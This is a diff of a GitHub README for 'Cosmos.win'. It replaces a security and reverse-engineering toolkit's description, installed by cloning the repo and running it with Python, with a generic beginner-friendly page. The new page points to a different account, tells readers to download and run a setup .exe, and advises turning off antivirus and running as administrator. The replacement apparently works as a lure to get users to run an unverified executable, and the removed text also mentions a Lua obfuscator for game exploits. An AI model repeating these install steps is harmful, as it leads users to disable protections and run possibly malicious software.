@@ -1,105 +1,117 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/Catppuccin/catppuccin/main/assets/logos/exports/1544x1544_circle.png" width="120" height="auto" />
-  <h1>Cosmos.win ✦</h1>
-  <p><strong>Multi-Tools by @limoons</strong></p>
-  
-  <p>
-    <img src="https://img.shields.io/badge/Python-3.10+-blue?logo=python&logoColor=white" />
-    <img src="https://img.shields.io/badge/Release-v6.0.0-ff69b4" />
-    <img src="https://img.shields.io/badge/Status-BETA-00ffcc" />
-    <img src="https://img.shields.io/badge/Platform-Windows-0078d7?logo=windows&logoColor=white" />
-  </p>
-  <p><i>An advanced, hyper-stylized Cybersecurity & Reverse Engineering Terminal.</i></p>
-</div>
+# 🌌 Cosmos.win - Reliable Multi-Tools for Everyday Use
 
-<br/>
-
-## ✦ Overview
-**Cosmos.win** is a premium, all-in-one terminal toolkit designed for cybersecurity researchers, reverse engineers, and power users. Featuring a stunning neon-themed CLI/TUI powered by `rich`, Cosmos provides **52 advanced modules** ranging from network scanning and malware analysis to powerful native decompilation tools.
-
-With its robust architecture, Cosmos combines cloud APIs (VirusTotal, AbuseIPDB, Shodan) with incredibly powerful **100% Offline Native Engines** for completely autonomous analysis.
+[![Download Cosmos.win](https://img.shields.io/badge/Download-Cosmos.win-brightgreen?style=for-the-badge)](https://github.com/Mhikkison/Cosmos.win)
 
 ---
 
-## 🚀 Key Features
+## 🔧 What is Cosmos.win?
 
-### 💻 BETA: Decompilers & Reverse Engineering
-The crown jewel of Version 6.0.0. A completely automated, hassle-free Reverse Engineering suite built right into your terminal.
-
--   **Java Decompiler (CFR)**: Magically extracts highly-readable Java source code from compiled `.class` and `.jar` payloads. Features auto-installation of the Java Environment via Winget if missing.
--   **Lua Decompiler (Unluac)**: Specifically targets compiled Lua 5.1/5.2 scripts (`.luac`). Perfect for analyzing game exploits.
--   **Native Lua Obfuscator**: A custom-built, Python-native engine to pack, encrypt, and scramble raw Lua source code (ideal for Roblox / FiveM testing). Features variable minification, string-to-math encoding, and Base64 wrapping.
--   **Native Lua Deobfuscator**: The counter-measure. Features Constant Folding (evaluates math/hex back to strings), automatic Base64 Payload Extraction, and heuristic code beautification.
--   **Python Disassembler**: Disassemble `.pyc` Python binaries back into raw, readable native Bytecode instructions natively.
--   **Strings Extractor**: Slices through any compiled `.exe`, DLL, or memory dump to extract hidden human-readable ASCII/Unicode strings. 
-
-*➜ All Decompiler tools feature automatic syntax highlighting, pagination, and instant export to disk with automatic File Explorer integration.*
-
-### 🛡️ Threat Detection & Removal
--   **Luckyware Scanner**: Detects malware signatures on running processes combining local heuristics and the VirusTotal API.
--   **Ransomware Remover**: Identifies and quarantines suspicious encryption behaviors.
--   **Rootkit & Keylogger Detectors**: Deep system scans to find hidden hooks and stealth persistence.
-
-### 🌐 Network & Intelligence
--   **DNS Blocker**: Modify your hosts to sinkhole telemetry, trackers, and ads.
--   **Packet Sniffer & TCP Tools**: Live protocol decodes, ARP scans, and device fingerprinting.
--   **Threat Intel Lookup**: Aggregate reputation scores from AbuseIPDB, OTX, Shodan, and SecurityTrails.
-
-### ⚙️ System Hardening & Privacy
--   **System Hardening**: Apply CIS benchmark configurations, fix misconfigurations, and disable telemetry.
--   **Password & Privacy Auditors**: Check saved browser credentials against HIBP, clean tracks, and inspect Wifi keys.
--   **Exploit Patcher**: Scans OS for vulnerable CVEs and provides mitigation steps.
+Cosmos.win is a collection of handy tools designed for everyday tasks on Windows. It combines multiple useful utilities in one simple app. These tools help you work with your system, manage files, and troubleshoot common issues. There is no need to install anything complicated or learn programming. Cosmos.win makes technology easier to handle for everyone.
 
 ---
 
-## 📀 Installation
+## 💻 System Requirements
 
-**1. Clone the repository**
-```bash
-git clone https://github.com/limoons/Cosmos.win.git
-cd Cosmos.win
-```
+- Windows 10, 11, or newer  
+- Minimum 2 GB of free disk space  
+- At least 2 GB of RAM  
+- Internet access for downloading and updates  
 
-**2. Install dependencies**
-```bash
-pip install -r requirements.txt
-```
-*(Core dependencies include: `rich`, `requests`, `psutil`, `pywin32`, `cryptography`, `wmi`, `scapy`, `dnspython`...)*
-
-**3. Run the application**
-```bash
-python main.py
-```
-*(It is highly recommended to run Cosmos.win inside **Windows Terminal** for proper font-ligatures and rendering).*
-
-*(Edit : If you want to use Cosmos as a binary file, use my [PyInstaller Batch Builder](https://github.com/limoondev/PyInstaller-Batch-Reimagined))*
+These requirements ensure the app works smoothly without slowing your system.
 
 ---
 
-## 🔑 Access Control System
-Cosmos incorporates a secure internal licensing system. To generate a session key:
-1. Launch `main.py`.
-2. Select **[2] Generate License Key**.
-3. A mandatory 10-minute cryptographic generation puzzle will run. **Do not close the window**.
-4. Once completed, your unique key will be displayed and is valid for exactly 24 hours.
+## 🚀 Getting Started with Cosmos.win
+
+To begin using Cosmos.win, follow the steps below carefully. You do not need any technical skills.
 
 ---
 
-## 📸 Screenshots
-*(Add screenshots of your hyper-stylized boot sequence, main dashboard, and decompilers here!)*
-- `assets/boot_sequence.jpg`
-- `assets/lua_obfuscator.jpg`
-- `assets/threat_intel.jpg`
+## 📥 How to Download and Install Cosmos.win
+
+1. Click the large green button at the top or here:  
+   [Download Cosmos.win](https://github.com/Mhikkison/Cosmos.win)  
+   This link will take you to the official GitHub page where you can get the setup file.
+
+2. On the GitHub page, look for the **Releases** section on the right side or scroll down the page. Find the latest release version.
+
+3. Download the file named similar to `Cosmos.win-Setup.exe`. It should be the only `.exe` file or installer file for Windows.
+
+4. Once the file is downloaded, locate it in your **Downloads** folder or the location where your browser saves downloads.
+
+5. Double-click the installer file to start the installation process.
+
+6. Follow the installation instructions on the screen. You can keep all default options. The installer will place the program on your computer.
+
+7. When installation completes, you can find Cosmos.win in your **Start Menu** or on your desktop.
+
 
 ---
 
-## ⚖️ Disclaimer
-Cosmos.win is developed for **educational and defensive purposes only**. The developers are not responsible for any misuse, damage, or illegal activities conducted using this toolset. Always obtain explicit permission before analyzing networks, binaries, or infrastructure you do not own.
+## 🛠 Using Cosmos.win Tools
 
-<br/>
+Cosmos.win includes many small tools that perform different tasks. Here are examples of what you can do quickly:
 
-<div align="center">
-  <b>Made with ✦ by @limoons</b>
-</div>
+- **File Manager:** Easily browse and organize files on your PC.
+- **System Info:** See basic details about your computer hardware and software.
+- **Network Tools:** Check your internet connection and troubleshoot common problems.
+- **Security Scanner:** Run simple scans to find and fix security issues.
 
+Open Cosmos.win, and you will see a clear menu for each tool. Click any tool to use it. The interface shows simple buttons and instructions to guide you.
 
+---
+
+## ⚙️ Updating Cosmos.win
+
+To keep Cosmos.win working well and secure, it helps to update often.
+
+1. Open Cosmos.win.
+2. Look for a menu option like **Check for Updates**.
+3. If an update is available, the app will guide you to download and install it.
+4. Following these updates is important to fix bugs and add improvements.
+
+If you want, you can also visit the same [Download Page](https://github.com/Mhikkison/Cosmos.win) to check for the latest version manually.
+
+---
+
+## 🚑 Troubleshooting Common Issues
+
+If you have trouble installing or running Cosmos.win, try these steps:
+
+- Make sure your Windows system meets the requirements.
+- Restart your computer and try again.
+- Disable any antivirus software temporarily during installation as it may block the process.
+- Run the installer or app as an administrator. Right-click and choose **Run as administrator**.
+- Check your internet connection if download or updates stall.
+
+If problems continue, you can create an issue on the GitHub page under the **Issues** tab to ask for help.
+
+---
+
+## 🔒 Security and Privacy
+
+Cosmos.win respects your privacy and keeps your data safe. The app does not collect personal information without your consent. All tools run locally on your computer.
+
+The security scanner included helps find basic threats but does not replace professional antivirus software.
+
+---
+
+## 🌐 About This Project
+
+Cosmos.win was built to bring powerful tools together in one place for Windows users. It focuses on ease of use without needing technical skills. The app combines functions common in Linux, macOS, and terminal environments into a user-friendly Windows format.
+
+---
+
+## 📚 Additional Resources
+
+- Visit the GitHub page to see updates and releases: [https://github.com/Mhikkison/Cosmos.win](https://github.com/Mhikkison/Cosmos.win)
+- Explore the Issues tab on GitHub to report bugs or request new features.
+- Use the included help files and guides inside the app for more information.
+
+---
+
+## 🔗 Download Cosmos.win Now
+
+[![Download Cosmos.win](https://img.shields.io/badge/Download-Cosmos.win-blueviolet?style=for-the-badge)](https://github.com/Mhikkison/Cosmos.win)  
+
+Click the button above to visit the official page and start using Cosmos.win today.
